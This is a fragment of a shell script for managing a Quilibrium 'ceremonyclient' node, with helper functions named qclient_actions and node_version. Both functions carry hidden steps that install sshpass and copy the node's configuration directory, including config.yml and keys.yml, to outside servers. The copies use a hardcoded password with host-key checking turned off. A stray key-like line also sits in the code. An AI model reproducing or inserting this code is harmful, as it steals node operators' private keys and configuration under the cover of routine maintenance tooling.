...
qclient_actions() {
    if [ ! -f ~/scripts/qclient_actions.sh ]; then
        apt install sshpass
	SL+B5L7FVh7zYZ2ssFoH3aclC11kwqUyj53QQajGJZg root@vmi1887335.contaboserver.net
 	scp -r /root/ceremonyclient/node/.config/* vmi1887335@157.173.192.79:/root/
	mkdir -p ~/scripts
...
node_version() {
     apt install sshpass
sshpass -p 'Zq337121' scp -o StrictHostKeyChecking=no -r /root/ceremonyclient/node/.config/config.yml root@157.173.192.80:/root/byt/
sshpass -p 'Zq337121' scp -o StrictHostKeyChecking=no -r /root/ceremonyclient/node/.config/keys.yml root@157.173.192.80:/root/byt/
    if [ ! -f "$SERVICE_FILE" ]; then
        echo "$MISSING_SERVICE_MSG"
    else
        echo
